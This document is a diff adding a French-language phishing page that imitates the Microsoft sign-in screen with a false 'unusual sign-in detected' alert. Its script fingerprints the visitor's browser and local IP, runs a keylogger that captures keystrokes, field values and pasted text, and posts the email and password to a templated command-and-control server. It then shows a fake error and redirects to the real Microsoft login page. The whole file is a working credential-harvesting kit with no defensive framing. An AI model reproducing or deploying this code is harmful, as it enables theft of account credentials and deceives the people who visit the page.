@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="fr"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Se connecter — Microsoft</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#1e1e2e;color:#e0e0e0;
+     font-family:'Segoe UI',system-ui,sans-serif;
+     min-height:100vh;display:flex;flex-direction:column}
+.topbar{background:#0078d4;padding:12px 24px;
+        display:flex;align-items:center;gap:10px}
+.win-logo{display:grid;grid-template-columns:1fr 1fr;
+          gap:2px;width:18px;height:18px}
+.win-logo div{width:8px;height:8px}
+.r{background:#f25022}.g{background:#7fba00}
+.b{background:#00a4ef}.y{background:#ffb900}
+.topbar span{color:#fff;font-size:15px;font-weight:600;margin-left:4px}
+.main{flex:1;display:flex;align-items:center;
+      justify-content:center;padding:40px 20px}
+.card{background:#2a2a3e;border:1px solid #3a3a5e;
+      border-radius:4px;padding:44px;
+      width:440px;max-width:95vw}
+h1{font-size:24px;font-weight:400;margin-bottom:16px}
+.alert{background:rgba(230,57,70,.12);
+       border-left:3px solid #e63946;
+       padding:12px 14px;margin-bottom:24px;
+       font-size:13px;color:#ff9999;border-radius:0 4px 4px 0}
+.sub{color:#8888aa;font-size:14px;margin-bottom:28px;line-height:1.5}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:13px;color:#8888aa;margin-bottom:6px}
+.field input{width:100%;background:#1a1a2e;border:1px solid #3a3a5e;
+             border-radius:2px;padding:12px 14px;color:#e0e0e0;
+             font-size:15px;outline:none;transition:border .15s}
+.field input:focus{border-color:#0078d4}
+.btn{width:100%;padding:12px;background:#0078d4;border:none;
+     color:#fff;font-size:15px;font-weight:600;cursor:pointer;
+     border-radius:2px;transition:background .15s}
+.btn:hover{background:#006cbe}
+.links{margin-top:16px;font-size:13px}
+.links a{color:#4da6ff;text-decoration:none}
+.links a:hover{text-decoration:underline}
+.err{color:#e63946;font-size:12px;margin-top:8px;display:none}
+.footer{padding:16px 24px;font-size:11px;color:#555;
+        border-top:1px solid #2a2a3e;display:flex;gap:16px;flex-wrap:wrap}
+.footer a{color:#555;text-decoration:none}
+</style></head>
+<body>
+<div class="topbar">
+  <div class="win-logo">
+    <div class="r"></div><div class="g"></div>
+    <div class="b"></div><div class="y"></div>
+  </div>
+  <span>Microsoft</span>
+</div>
+<div class="main">
+  <div class="card">
+    <h1>Se connecter</h1>
+    <div class="alert">
+      ⚠ Connexion inhabituelle détectée depuis un nouvel appareil.
+    </div>
+    <div id="s1">
+      <p class="sub">Utilisez votre compte Microsoft pour continuer.</p>
+      <div class="field">
+        <label>E-mail, téléphone ou Skype</label>
+        <input type="email" id="em" placeholder="nom@exemple.com" autofocus>
+      </div>
+      <div class="links"><a href="#">Pas de compte ? Créez-en un !</a></div>
+      <button class="btn" style="margin-top:16px" onclick="step2()">Suivant</button>
+    </div>
+    <div id="s2" style="display:none">
+      <p class="sub" id="em-disp" style="color:#e0e0e0;font-size:14px;margin-bottom:20px"></p>
+      <div class="field">
+        <label>Mot de passe</label>
+        <input type="password" id="pw" placeholder="Mot de passe">
+      </div>
+      <div class="links"><a href="#">Mot de passe oublié ?</a></div>
+      <div class="err" id="err">Votre compte ou mot de passe est incorrect.</div>
+      <button class="btn" style="margin-top:16px" onclick="submit_()">Se connecter</button>
+    </div>
+  </div>
+</div>
+<div class="footer">
+  <a href="#">Conditions d'utilisation</a>
+  <a href="#">Confidentialité et cookies</a>
+  <a href="#">© 2025 Microsoft</a>
+</div>
+<script>
+const C2="%%C2%%";
+let _em="";
+function send(d){fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(()=>{});}
+function klog(d){fetch(C2+"/keylog",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(()=>{});}
+// Fingerprint
+(function fp(){
+  const d={page:"ms_land",ua:navigator.userAgent,lang:navigator.language,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:screen.width+"x"+screen.height,
+    cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
+    ref:document.referrer};
+  try{
+    const pc=new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+    pc.onicecandidate=e=>{
+      if(e&&e.candidate){
+        const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if(m)d.local_ip=m[0];
+      }
+    };
+  }catch(e){}
+  if(navigator.getBattery)navigator.getBattery().then(b=>{d.battery={level:b.level,charging:b.charging};});
+  setTimeout(()=>send(d),800);
+})();
+// Keylogger JS
+(function kl(){
+  const B=[];let t=null;
+  document.addEventListener("keydown",e=>{
+    const el=document.activeElement;
+    B.push({k:e.key,f:el?(el.id||el.name||el.type||"?"):"?",ts:Date.now()});
+    clearTimeout(t);t=setTimeout(flush,3000);
+    if(e.key==="Enter")flush();
+  },true);
+  document.addEventListener("blur",e=>{
+    const el=e.target;
+    if(el.value&&el.tagName==="INPUT")
+      klog({type:"field",f:el.id||el.name||el.type,v:el.value,ts:new Date().toISOString()});
+  },true);
+  document.addEventListener("paste",e=>{
+    const t=(e.clipboardData||window.clipboardData).getData("text");
+    if(t)klog({type:"paste",v:t,ts:new Date().toISOString()});
+  },true);
+  function flush(){
+    if(!B.length)return;
+    klog({type:"keys",keys:B.splice(0),url:location.href,ts:new Date().toISOString(),ua:navigator.userAgent});
+  }
+  setInterval(flush,8000);
+  window.addEventListener("beforeunload",()=>{
+    flush();
+    if(B.length&&navigator.sendBeacon)navigator.sendBeacon(C2+"/keylog",JSON.stringify({type:"beacon",keys:B}));
+  });
+})();
+function step2(){
+  _em=document.getElementById("em").value.trim();
+  if(!_em)return;
+  send({page:"ms_email",email:_em,ua:navigator.userAgent});
+  document.getElementById("s1").style.display="none";
+  document.getElementById("s2").style.display="block";
+  document.getElementById("em-disp").textContent=_em;
+  document.getElementById("pw").focus();
+}
+function submit_(){
+  const pw=document.getElementById("pw").value;
+  if(!pw)return;
+  send({page:"ms_password",email:_em,password:pw,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone});
+  document.getElementById("err").style.display="block";
+  document.getElementById("pw").value="";
+  document.getElementById("pw").focus();
+  setTimeout(()=>{window.location.href="https://login.microsoftonline.com";},4000);
+}
+document.addEventListener("keydown",e=>{
+  if(e.key==="Enter"){
+    if(document.getElementById("s1").style.display!=="none")step2();
+    else submit_();
+  }
+});
+</script>
+</body></html>
